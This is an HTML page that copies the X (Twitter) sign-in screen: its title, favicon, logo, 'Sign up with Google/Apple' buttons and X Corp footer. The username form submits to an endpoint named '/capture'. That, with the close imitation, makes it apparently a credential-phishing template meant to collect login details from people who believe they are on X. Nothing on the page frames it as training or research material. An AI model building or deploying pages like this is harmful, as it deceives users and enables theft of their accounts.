<!DOCTYPE html>
<html lang="en" style="color-scheme: dark;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to X / X</title>
    <link rel="icon" href="https://abs.twimg.com/favicons/twitter.3.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
        
        body {
            background: #000;
            min-height: 100vh;
            display: flex;
        }
        
        .left {
            flex: 1;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .left svg {
            width: 50%;
            max-width: 400px;
            fill: #e7e9ea;
        }
        
        .right {
            flex: 1;
            display: flex;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 440px;
            width: 100%;
        }
        
        h1 {
            color: #e7e9ea;
            font-size: 64px;
            font-weight: 700;
            margin-bottom: 48px;
            letter-spacing: -1.2px;
            line-height: 84px;
        }
        
        h2 {
            color: #e7e9ea;
            font-size: 31px;
            font-weight: 700;
            margin-bottom: 32px;
        }
        
        .btn {
            width: 100%;
            border: 1px solid #536471;
            border-radius: 9999px;
            padding: 12px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: #fff;
            color: #000;
            transition: background 0.2s;
        }
        .btn:hover { background: #e6e6e6; }
        
        .btn-outline {
            background: transparent;
            color: #fff;
            border-color: #536471;
        }
        .btn-outline:hover { background: rgba(255,255,255,0.1); }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 16px 0;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #2f3336;
        }
        .divider span {
            color: #71767b;
            padding: 0 8px;
            font-size: 15px;
        }
        
        input {
            width: 100%;
            background: #000;
            border: 1px solid #536471;
            border-radius: 4px;
            padding: 16px;
            color: #e7e9ea;
            font-size: 17px;
            margin-bottom: 16px;
        }
        input:focus { outline: none; border-color: #1d9bf0; }
        
        .btn-next {
            width: 100%;
            background: #fff;
            color: #000;
            border: none;
        }
        .btn-next:hover { background: #d7dbdc; }
        
        .forgot {
            color: #1d9bf0;
            font-size: 15px;
            text-decoration: none;
            margin-top: 24px;
            display: block;
        }
        .forgot:hover { text-decoration: underline; }
        
        .signup {
            margin-top: 40px;
            color: #71767b;
            font-size: 17px;
        }
        .signup a {
            color: #1d9bf0;
            text-decoration: none;
        }
        .signup a:hover { text-decoration: underline; }
        
        footer {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 12px 16px;
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 16px;
            font-size: 13px;
        }
        footer a {
            color: #71767b;
            text-decoration: none;
        }
        footer a:hover { text-decoration: underline; }
        
        @media (max-width: 1000px) {
            .left { display: none; }
            .right { flex: 1; justify-content: center; }
            h1 { font-size: 40px; line-height: 52px; }
        }
    </style>
</head>
<body>
    <div class="left">
        <svg viewBox="0 0 24 24" aria-hidden="true">
            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
        </svg>
    </div>
    
    <div class="right">
        <div class="container">
            <h1>Happening now</h1>
            <h2>Join today.</h2>
            
            <button class="btn">
                <svg viewBox="0 0 24 24" width="18"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
                Sign up with Google
            </button>
            
            <button class="btn">
                <svg viewBox="0 0 24 24" width="18"><path d="M16.365 1.43c0 1.14-.493 2.27-1.177 3.08-.684.816-1.813 1.508-3.252 1.508-1.44 0-2.568-.692-3.252-1.508-.684-.81-1.177-1.94-1.177-3.08L1.565 5.855c0 1.14.493 2.27 1.177 3.08.684.82 1.813 1.508 3.252 1.508 1.44 0 2.568-.688 3.252-1.508.684-.81 1.177-1.94 1.177-3.08h3.57zM12 8.688c-1.44 0-2.568-.692-3.252-1.508-.684-.816-1.177-1.94-1.177-3.08H4c0 1.14.493 2.27 1.177 3.08.684.82 1.813 1.508 3.252 1.508 1.44 0 2.568-.688 3.252-1.508.684-.81 1.177-1.94 1.177-3.08H12z"/></svg>
                Sign up with Apple
            </button>
            
            <div class="divider"><span>or</span></div>
            
            <form action="/capture" method="POST">
                <input type="text" name="username" placeholder="Phone, email, or username" required>
                <button type="submit" class="btn btn-next">Next</button>
            </form>
            
            <button class="btn btn-outline">Forgot password?</button>
            
            <p class="signup">
                Don't have an account? <a href="#">Sign up</a>
            </p>
        </div>
    </div>
    
    <footer>
        <a href="#">About</a>
        <a href="#">Download the X app</a>
        <a href="#">Help Center</a>
        <a href="#">Terms of Service</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Cookie Policy</a>
        <a href="#">Imprint</a>
        <a href="#">Accessibility</a>
        <a href="#">Ads info</a>
        <a href="#">© 2026 X Corp.</a>
    </footer>
</body>
</html>
